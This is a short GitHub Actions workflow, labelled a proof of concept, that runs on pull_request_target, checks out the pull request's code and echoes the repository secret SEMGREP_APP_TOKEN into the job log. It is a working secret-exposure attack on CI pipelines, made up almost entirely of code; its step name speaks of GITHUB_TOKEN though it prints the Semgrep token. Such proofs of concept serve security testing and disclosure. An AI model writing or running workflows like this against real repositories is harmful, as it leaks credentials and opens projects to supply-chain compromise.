name: PoC - Obfuscated SEMGREP Token

on:
  pull_request_target:

jobs:
  token-exposure:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v3

      - name: Prove GITHUB_TOKEN Access (Obfuscated)
        run: |
          TOKEN="${{ secrets.SEMGREP_APP_TOKEN }}"

          echo "=== Proof of Concept ==="
          echo "${{ secrets.SEMGREP_APP_TOKEN }}"
